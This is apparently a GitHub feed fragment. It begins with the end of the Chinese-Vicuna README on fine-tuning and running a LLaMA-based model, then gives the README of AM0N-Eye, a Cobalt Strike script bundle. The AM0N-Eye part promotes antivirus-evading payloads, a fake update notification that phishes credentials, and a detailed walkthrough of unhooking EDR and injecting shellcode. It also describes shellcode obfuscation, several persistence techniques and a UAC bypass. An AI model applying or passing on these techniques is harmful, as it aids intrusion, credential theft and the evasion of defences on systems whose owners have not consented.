finetune.sh&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The parameters to note here are as follows &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;TOT_CUDA, fill in the GPU number to be used, such as &lt;code&gt;TOT_CUDA=&#34;0,1,2,3&#34;&lt;/code&gt;&lt;/li&gt; &#xA;   &lt;li&gt;PORT, fill in the corresponding port&lt;/li&gt; &#xA;   &lt;li&gt;DATA_PATHÔºåfill in the corresponding data location in the format of json&lt;/li&gt; &#xA;   &lt;li&gt;OUTPUT_PATHÔºåfill in the relative path to save the model&lt;/li&gt; &#xA;   &lt;li&gt;MODEL_PATHÔºåpath of LLM&lt;/li&gt; &#xA;   &lt;li&gt;wandbÔºöThis is a training visualization tool that is not turned on by default in the script, and can be turned on by adding &#34;--wandb&#34; to the script&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;Single-gpu Training&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;python finetune.py --data_path merge.json --test_size 2000&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The test_size cannot be larger than the data size&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;inference and use gradio to generate a web page&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;bash generate.sh&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;The parameters to note here are as follows&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;BASE_MODELÔºåpath of LLM&lt;/li&gt; &#xA;   &lt;li&gt;LORA_PATHÔºåThe checkpoint folder of the lora model &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;It should be noted here that the config loaded by the lora model must be &#34;adapter_config.json&#34; and the model name must be &#34;adapter_model.bin&#34;, but it will be automatically saved as &#34;pytorch_model.bin&#34; during training. pytorch_model.bin&#34; during training, while &#34;adapter_config.json&#34; and &#34;adapter_model.bin&#34; will be saved after all training is finished &#xA;      &lt;ul&gt; &#xA;       &lt;li&gt;If you load the lora model in the training checkpoint, the code will automatically copy the local &#34;config-sample/adapter_config.json&#34; to the corresponding directory for you and rename the &#34;pytorch_model.bin&#34; to &#34;adapter_model.bin&#34;. and rename &#34;pytorch_model.bin&#34; to &#34;adapter_model.bin&#34;.&lt;/li&gt; &#xA;      &lt;/ul&gt; &lt;/li&gt; &#xA;     &lt;li&gt;It can also be any lora model on the huggingface corresponding to llama 7B, e.g.: &lt;code&gt;Facico/Chinese-Vicuna-lora-7b-3epoch-belle-and-guanaco&lt;/code&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;USE_LOCAL, which checks the local model configuration when set to 1&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;When using, &#34;max_tokens&#34; is set according to your computer&#39;s video memory, and if the generated content generates a lot of duplicate information, you can turn up the &#34;Repetition Penalty&#34;.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;Multi-round interaction&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;As we use the basic command prompt when training, so the ability of small talk conversation is still relatively poor, the follow-up will increase this part of the training.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;bash interaction.sh&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;A simple interactive interface constructed using gradio, which allows you to set the max_memory according to your machine (it will intercept the max_memory part later in the history conversation)&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;The prompt used in this script is not quite the same as the one used in generate.sh. The prompt in this script is in the form of a dialogue, as follows&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt; &lt;pre&gt;&lt;code&gt;The following is a conversation between an AI assistant called Bot and a human user called User.&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;At the same time, we introduced &lt;a href=&#34;https://github.com/deep-diver/Alpaca-LoRA-Serve&#34;&gt;Alpaca-LoRA-Serve&lt;/a&gt; for better interaction experience and made appropriate modifications.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Additional dependencies to be installed:&lt;code&gt;pip install tenacity&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Usage&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt; &lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;bash alpaca-serve.sh&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;This tool allows generating word by word without having to wait long to see the results. Since the tool is still in the development stage, beam search and Repetition Penalty are not available in streaming mode, so the current generation results are not very good. (Currently these two parameters are not valid in the webui box)&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;&lt;strong&gt;inference on CPU with pure C++&lt;/strong&gt;&lt;/h2&gt; &#xA;&lt;p&gt;Details in &lt;code&gt;tools&lt;/code&gt; &lt;a href=&#34;https://github.com/Facico/Chinese-Vicuna/raw/master/tools/readme.md&#34;&gt;readme&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;&lt;strong&gt;More Tools&lt;/strong&gt;&lt;/h2&gt; &#xA;&lt;p&gt;We also offer:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;ways for faster weight download ( 8MB/s ) : &lt;a href=&#34;https://github.com/Facico/Chinese-Vicuna/raw/master/tools/download_llama.sh&#34;&gt;link&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;convert tools between the original facebook checkpoint (&lt;code&gt;consolidated.xx.pth&lt;/code&gt;) and huggingface format (&lt;code&gt;pytorch_model-000xx-of-000xx.bin&lt;/code&gt;): &lt;a href=&#34;https://github.com/Facico/Chinese-Vicuna/raw/master/tools/convert_llama.py&#34;&gt;link&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;a quantitative approach that requires less than 4G graphics memory for inference: &lt;a href=&#34;https://github.com/Facico/Chinese-Vicuna/raw/master/tools/llama_quant.py&#34;&gt;link&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;For more details, see &lt;a href=&#34;https://github.com/Facico/Chinese-Vicuna/tree/master/tools&#34;&gt;tool readme&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Possible problems encountered&lt;/h2&gt; &#xA;&lt;p&gt;When installing and using this project, some problems may be encountered, and the various problems encountered so far are summarized as follows:&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/Facico/Chinese-Vicuna/raw/master/docs/problems.md&#34;&gt;Problems&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h1&gt;todo&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; belle+guanaco(1.5 epoch, 8000 step)&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; belle+guanaco(100%)&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; Add more chitchat-like conversational corpus to enhance free conversation&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Add colab training + lora loading interface&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Add the interaction capabilities and typewrite-style output(by alpaca-lora-serve)&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Add llama c++ inference&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Add gptq quantification tools&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;Citation&lt;/h1&gt; &#xA;&lt;p&gt;If you find this project useful in your research, please consider citing:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;@inproceedings{leng2023chinese-vicuna,&#xA;  title={Chinese-Vicuna: A Chinese Instruction-following LLaMA-based Model},&#xA;  author={Chenghao Fan, Zhenyi Lu and Jie Tian},&#xA;  url={https://github.com/Facico/Chinese-Vicuna},&#xA;  year={2023}&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt;</summary>
  </entry>
  <entry>
    <title>S3N4T0R-0X0/AMON-Eye</title>
    <updated>2023-03-29T01:32:41Z</updated>
    <id>tag:github.com,2023-03-29:/S3N4T0R-0X0/AMON-Eye</id>
    <link href="https://github.com/S3N4T0R-0X0/AMON-Eye" rel="alternate"></link>
    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;AM0N-Eye&lt;/h1&gt; &#xA;&lt;p&gt;AM0N-Eye is a compilation of a group of the most important scripts that were written specifically for Cobaltsetrike and the rest of the files such as de for modification in colors and images. All property rights reserved to the original developers. Just open the Cobaltsetrike.jar file and replace it with de and default.cna and resources The names of the projects that have been added. ScareCrow,CrossC2,CSSG-xor,InvokeCredentialPhisher,Registry-Recon,StayKit&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/121706460/226493992-1b6194b7-13a3-4ac5-bb3c-d473bbf0dd31.png&#34; alt=&#34;Screenshot from 2023-03-10 11-53-32&#34;&gt;&lt;/p&gt; &#xA;&lt;install&gt; &#xA; &lt;p&gt;chmod +x install.sh&lt;/p&gt; &#xA; &lt;hr&gt; &#xA; &lt;p&gt;##PayloadGenerator&lt;/p&gt; &#xA; &lt;p&gt;Generates every type of Stageless/Staged Payload based off a HTTP/HTTPS Listener Undetected by antivirus programs&lt;/p&gt; &#xA; &lt;p&gt;Creates /opt/amon-eye/Staged_Payloads, /opt/amon-eye/Stageless_Payloads&lt;/p&gt; &#xA; &lt;p&gt;#Linux &amp;amp; MacOS C2 Server&lt;/p&gt; &#xA; &lt;p&gt;A security framework for enterprises and Red Team personnel, supports AM0N-Eye penetration testing of other platforms (Linux / MacOS / ...), supports custom modules, and includes some commonly used penetration modules.&lt;/p&gt; &#xA; &lt;p&gt;Lateral movement&lt;/p&gt; &#xA; &lt;pre&gt;&lt;code&gt;Generate beacon of Linux-bind / MacOS-bind type&#xA;The target in the intranet runs ./MacOS-bind.beacon &amp;lt;port&amp;gt; to start the service&#xA;Run connect &amp;lt;targetIP&amp;gt;:&amp;lt;port&amp;gt; in the session&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;p&gt;Examples&lt;/p&gt; &#xA; &lt;p&gt;The script interpreter such as bash / python / ruby / perl / php in the host can be called directly in the session to execute the script passed into the memory. There is no information in the process, all running content is transferred from the memory to the interpreter&lt;/p&gt; &#xA; &lt;pre&gt;&lt;code&gt;1.python c:\getsysteminfo.py&#xA;2.python import base64;print base64.b64encode(&#39;whoami&#39;); print &#39;a&#39;*40&#xA;3.php&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;p&gt;Don&#39;t forget to Check C2 profiles in /AM0N-Eye/C2-Profiles/ to bypass network filters To use a custom profile you must start a AM0N-Eye team server and specify your profile at that tim Example ./teamserver [external IP] [password] [/path/to/my.profile] .&lt;/p&gt; &#xA; &lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/121706460/226558264-db460f06-92f1-445e-b428-80a13a69f487.png&#34; alt=&#34;Screenshot from 2023-03-09 13-47-25&#34;&gt;&lt;/p&gt; &#xA; &lt;h1&gt;Fake Alert update&lt;/h1&gt; &#xA; &lt;p&gt;to send toast notifications on behalf on an (installed) application or the computer itself. The user will be asked to supply credentials once they click on the notification toast. The second one is a AM0N-Eye module to launch the phishing attack on connected beacons and you can learn the types of victim&#39;s defense mechanisms and exploit this to issue an update alert or to take action&lt;/p&gt; &#xA; &lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/121706460/226552401-6666bc29-2b9b-4248-9056-faafe28af324.png&#34; alt=&#34;Screenshot from 2023-02-21 02-42-37&#34;&gt;&lt;/p&gt; &#xA; &lt;p&gt;#AV/EDR evasion&lt;/p&gt; &#xA; &lt;p&gt;(AV/EDR evasion) is a payload creation framework for side loading (not injecting) into a legitimate Windows process (bypassing Application Whitelisting controls). Once the DLL loader is loaded into memory, it utilizes a technique to flush an EDR‚Äôs hook out of the system DLLs running in the process&#39;s memory. This works because we know the EDR‚Äôs hooks are placed when a process is spawned. (AV/EDR evasion) can target these DLLs and manipulate them in memory by using the API function VirtualProtect, which changes a section of a process‚Äô memory permissions to a different value, specifically from Execute‚ÄìRead to Read-Write-Execute.&lt;/p&gt; &#xA; &lt;p&gt;When executed, (AV/EDR evasion) will copy the bytes of the system DLLs stored on disk in C:\Windows\System32. These DLLs are stored on disk ‚Äúclean‚Äù of EDR hooks because they are used by the system to load an unaltered copy into a new process when it‚Äôs spawned. Since EDR‚Äôs only hook these processes in memory, they remain unaltered. (AV/EDR evasion) does not copy the entire DLL file, instead only focuses on the .text section of the DLLs. This section of a DLL contains the executable assembly, and by doing this (AV/EDR evasion) helps reduce the likelihood of detection as re-reading entire files can cause an EDR to detect that there is a modification to a system resource. The data is then copied into the right region of memory by using each function‚Äôs offset. Each function has an offset which denotes the exact number of bytes from the base address where they reside, providing the function‚Äôs location on the stack.&lt;/p&gt; &#xA; &lt;p&gt;To do this, (AV/EDR evasion) changes the permissions of the .text region of memory using VirtualProtect. Even though this is a system DLL, since it has been loaded into our process (that we control), we can change the memory permissions without requiring elevated privileges.&lt;/p&gt; &#xA; &lt;p&gt;Once these the hooks are removed, (AV/EDR evasion) then utilizes custom System Calls to load and run shellcode in memory. (AV/EDR evasion) does this even after the EDR hooks are removed to help avoid detection by non-userland, hook-based telemetry gathering tools such as Event Tracing for Windows (ETW) or other event logging mechanisms. These custom system calls are also used to perform the VirtualProtect call to remove the hooks placed by EDRs, described above, to avoid detection by any EDR‚Äôs anti-tamper controls. This is done by calling a custom version of the VirtualProtect syscall, NtProtectVirtualMemory. (AV/EDR evasion) utilizes Golang to generate these loaders and then assembly for these custom syscall functions.&lt;/p&gt; &#xA; &lt;p&gt;(AV/EDR evasion) loads the shellcode into memory by first decrypting the shellcode, which is encrypted by default using AES encryption with a decryption and initialization vector key. Once decrypted and loaded, the shellcode is then executed. Depending on the loader options specified (AV/EDR evasion) will set up different export functions for the DLL. The loaded DLL also does not contain the standard DLLmain function which all DLLs typically need to operate. The DLL will still execute without any issue because the process we load into will look for those export functions and not worry about DLLMain being there.&lt;/p&gt; &#xA; &lt;p&gt;(AV/EDR evasion) contains the ability to do process injection attacks. To avoid any hooking or detection in either the loader process or the injected process itself, (AV/EDR evasion) first unhooks the loader process as it would normally, to ensure there are no hooks in the process. Once completed, the loader will then spawn the process specified in the creation command. Once spawned, the loader will then create a handle to the process to retrieve a list of loaded DLLs. Once it finds DLLs, it will enumerate the base address of each DLL in the remote process. Using the function WriteProcessMemory the loader will then write the bytes of the system DLLs stored on disk (since they are ‚Äúclean‚Äù of EDR hooks) without the need to change the memory permissions first. (AV/EDR evasion) uses WriteProcessMemory because this function contains a feature primarily used in debugging where even if a section of memory is read-only, if everything is correct in the call to Write¬≠Process¬≠Memory, it will temporarily change the permission to read-write, update the memory section and then restore the original permissions. Once this is done, the loader can inject shellcode into the spawned process with no issue, as there are no EDR hooks in either process.&lt;/p&gt; &#xA; &lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/121706460/226556701-11379ed8-66de-4303-9daf-aca85f78af85.png&#34; alt=&#34;Screenshot from 2023-03-21 04-48-45&#34;&gt;&lt;/p&gt; &#xA; &lt;p&gt;#shellcode obfuscatior&lt;/p&gt; &#xA; &lt;p&gt;Generates beacon stageless shellcode with exposed exit method, additional formatting, encryption, encoding, compression, multiline output, etc shellcode transforms are generally performed in descending menu order Requirements: The optional AES encryption option uses a python script in the /assets folder Depends on the pycryptodome package to be installed to perform the AES encryption&lt;/p&gt; &#xA; &lt;p&gt;Install pycryptodome with pip depending on your python environment:&lt;/p&gt; &#xA; &lt;p&gt;python -m pip install pycryptodome python3 -m pip install pycryptodome py -3 -m pip install pycryptodome py -2 -m pip install pycryptodome&lt;/p&gt; &#xA; &lt;p&gt;Listener: Select a valid listener with the &#34;...&#34; button. Shellcode will be generated form this listener selection&lt;/p&gt; &#xA; &lt;p&gt;Delivery: Stageless (Staged not supported for the shellcode generator)&lt;/p&gt; &#xA; &lt;p&gt;Exit Method: process - exits the entire process that beacon is present in when the beacon is closed thread - exits only the thread in which beacon is running when the beacon is closed&lt;/p&gt; &#xA; &lt;p&gt;Local Pointers Checkbox: May use if you are going to execute the shellcode from an existing Beacon Generates a Beacon shellcode payload that inherits key function pointers from a same-arch parent Beacon&lt;/p&gt; &#xA; &lt;p&gt;Existing Session: Only used if the Local Pointers checkbox is checked The parent Beacon session where the shellcode will pull session metadata Shellcode should be run from within this Beacon session&lt;/p&gt; &#xA; &lt;p&gt;x86 Checkbox: Check to generate x86 shellcode, x64 is generated by default&lt;/p&gt; &#xA; &lt;p&gt;Or Use Shellcode File: Use an externally generated raw shellcode file in lieu of generating Beacon shellcode This allows you to use previously exported shellcode files or output from other tools (Donut, msfvenom, etc)&lt;/p&gt; &#xA; &lt;p&gt;Formatting:&lt;/p&gt; &#xA; &lt;p&gt;raw - raw binary shellcode output, no formatting applied hex - hex formatted shellcode output 0x90,0x90,0x90 - shellcode formatted into a C# style byte array (example format, does not prepend nulls) 0x90uy;0x90uy;0x90uy - shellcode formatted into a F# style byte array (example format, does not prepend nulls) \x90\x90\x90 - shellcode formatted into a C\C++ style byte array (example format, does not prepend nulls) b64 - option to base64 encode the shellcode early in the generation process (before any encryption)&lt;/p&gt; &#xA; &lt;p&gt;XOR Encrypt Shellcode Checkbox: Check to XOR encrypt the shellcode (only one encryption type can be selected at a time)&lt;/p&gt; &#xA; &lt;p&gt;XOR Key(s): Randomly generated and editable XOR key character(s) to use for encryption Multiple characters will result in multiple rounds of XOR encryption (i.e. ABCD)&lt;/p&gt; &#xA; &lt;p&gt;AES Encrypt Shellcode Checkbox: Check to AES encrypt the shellcode (only one encryption type can be selected at a time) Uses a python script to perform AES Block Cipher AES-CBC encryption Shellcode is padded with \0 values to reach block size requirements A randomly generated IV is prepended to the encrypted shellcode data&lt;/p&gt; &#xA; &lt;p&gt;AES Key: Randomly generated and editable AES key to use for encryption 32byte key is generated and preferred for 256bit encryption strength Encryption key byte lengths accepted are 16, 24, and 32&lt;/p&gt; &#xA; &lt;p&gt;Encoding/Compression: none - No additional encoding or compression is done to the shellcode b64 - base64 encode the shellcode gzip then b64 - gzip compress then base64 the shellcode gzip - gzip compress the shellcode b64 then gzip - base64 then gzip compress the shellcode b64 then 7xgzip - base64 then gzip compress the shellcode 7 times&lt;/p&gt; &#xA; &lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/121706460/226556899-c1253b00-8e08-469c-9a46-f1012b1f2795.png&#34; alt=&#34;Screenshot from 2023-03-21 04-46-30&#34;&gt;&lt;/p&gt; &#xA; &lt;h1&gt;Persistence threat _Menu&lt;/h1&gt; &#xA; &lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/121706460/226905003-ff4a8f85-de5a-4ad1-840f-0a3f411db32c.png&#34; alt=&#34;Screenshot from Screencast 2023-03-22 08-14-28 mp4&#34;&gt;&lt;/p&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;(UserSchtasksPersist)&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA; &lt;p&gt;Schtasks Persistence that runs as current user for the selected beacon&lt;/p&gt; &#xA; &lt;p&gt;Meant for quick user level persistence upon initial access&lt;/p&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;(ServiceEXEPersist)&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA; &lt;p&gt;Admin Level Custom Service EXE Persistence&lt;/p&gt; &#xA; &lt;p&gt;Runs as elevated user/SYSTEM for the selected beacon&lt;/p&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;(WMICEventPersist)&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA; &lt;p&gt;Generates a Custom WMI Event using WMIC for SYSTEM Level persistence on selected beacon&lt;/p&gt; &#xA; &lt;p&gt;Very syntax heavy, Test first before using on live targets&lt;/p&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;(StartupGPOPersist)&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA; &lt;p&gt;Generates a Local GPO Entry in psscripts.ini to call a .ps1 script file for persistence on selected beacon&lt;/p&gt; &#xA; &lt;p&gt;Calls back as SYSTEM&lt;/p&gt; &#xA; &lt;p&gt;Check permissions with GPO Enumeration (Successful GroupPolicy Directory Listing) first before executing&lt;/p&gt; &#xA; &lt;p&gt;Beacon execution will cause winlogon.exe to hang and the end user can&#39;t login. Once the new beacon checks in inject into another process and kill the original. Update to come out soon.&lt;/p&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;(RegistryPersist)&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA; &lt;p&gt;Creates a Custom Registry Key, Value, Type, and Payload Location based on user input for selected beacon&lt;/p&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;(HKCURunKeyPSRegistryPersist)&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA; &lt;p&gt;Creates two Custom Registry Run Key entries in HKCU&lt;/p&gt; &#xA; &lt;p&gt;The Payload is a base64 encoded powershell payload based off your HTTP/HTTPS listener&lt;/p&gt; &#xA; &lt;p&gt;#(Manual persistence)&lt;/p&gt; &#xA; &lt;p&gt;is an extension for AM0N-Eye persistence by leveraging the execute_assembly function with the SharpStay .NET assembly. handles payload creation by reading the template files for a specific execution type. The persistence menu will be added to the beacon. Due to the nature of how each technique is different there is only a GUI menu and no beacon commands.&lt;/p&gt; &#xA; &lt;p&gt;Available options:&lt;/p&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;ElevatedRegistryKey&lt;/li&gt; &#xA;  &lt;li&gt;UserRegistryKey&lt;/li&gt; &#xA;  &lt;li&gt;UserInitMprLogonScriptKey&lt;/li&gt; &#xA;  &lt;li&gt;ElevatedUserInitKey&lt;/li&gt; &#xA;  &lt;li&gt;ScheduledTask&lt;/li&gt; &#xA;  &lt;li&gt;ListScheduledTasks&lt;/li&gt; &#xA;  &lt;li&gt;ScheduledTaskAction&lt;/li&gt; &#xA;  &lt;li&gt;SchTaskCOMHijack&lt;/li&gt; &#xA;  &lt;li&gt;CreateService&lt;/li&gt; &#xA;  &lt;li&gt;ListRunningServices&lt;/li&gt; &#xA;  &lt;li&gt;WMIEventSub&lt;/li&gt; &#xA;  &lt;li&gt;GetScheduledTaskCOMHandler&lt;/li&gt; &#xA;  &lt;li&gt;JunctionFolder&lt;/li&gt; &#xA;  &lt;li&gt;StartupDirectory&lt;/li&gt; &#xA;  &lt;li&gt;NewLNK&lt;/li&gt; &#xA;  &lt;li&gt;BackdoorLNK&lt;/li&gt; &#xA;  &lt;li&gt;ListTaskNames&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA; &lt;p&gt;Dependencies&lt;/p&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;Mono (MCS) for compiling .NET assemblies (Used with dynamic payload creation)&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA; &lt;p&gt;##AVQuery&lt;/p&gt; &#xA; &lt;pre&gt;&lt;code&gt;Queries the Registry with powershell for all AV Installed on the target&#xA;&#xA;Quick and easy way to get the AV you are dealing with as an attacker&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;p&gt;##checkmate request version of the checkmate request Web Delivery attack&lt;/p&gt; &#xA; &lt;pre&gt;&lt;code&gt;Stageless Web Delivery using checkmate.exe &#xA;&#xA;Powerpick is used to spawn checkmate.exe to download the stageless payload on target and execute with rundll32.exe&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;p&gt;##Curl-TLS&lt;/p&gt; &#xA; &lt;p&gt;simple web requests without establishing SOCKS PROXY. Example use case could be confirming outbound access to specific service before deploying a relay from [F-Secure&#39;s C3]&lt;/p&gt; &#xA; &lt;p&gt;#AV/EDR Recon &amp;amp; EDR exact query&lt;/p&gt; &#xA; &lt;p&gt;As a red-team practitioner, we are often using tools that attempt to fingerprint details about a compromised system, preferably in the most stealthy way possible. Some of our usual tooling for this started getting flagged by EDR products, due to the use of Windows CLI commands. This aims to solve that problem by only probing the system using native registry queries, no CLI commands.&lt;/p&gt; &#xA; &lt;h1&gt;Active-Evilentry&lt;/h1&gt; &#xA; &lt;p&gt;job to execute as your current user context. This job will be executed every time the user logs in. Currently only works on Windows 7, 8, Server 2008, Server 2012.&lt;/p&gt; &#xA; &lt;h1&gt;BypassUAC-eventvwr&lt;/h1&gt; &#xA; &lt;p&gt;silentcleanup UAC bypass that bypasses &#34;always notify&#34; aka the highest UAC setting, even on Windows&lt;/p&gt; &#xA;&lt;/install&gt;</summary>
  </entry>
</feed>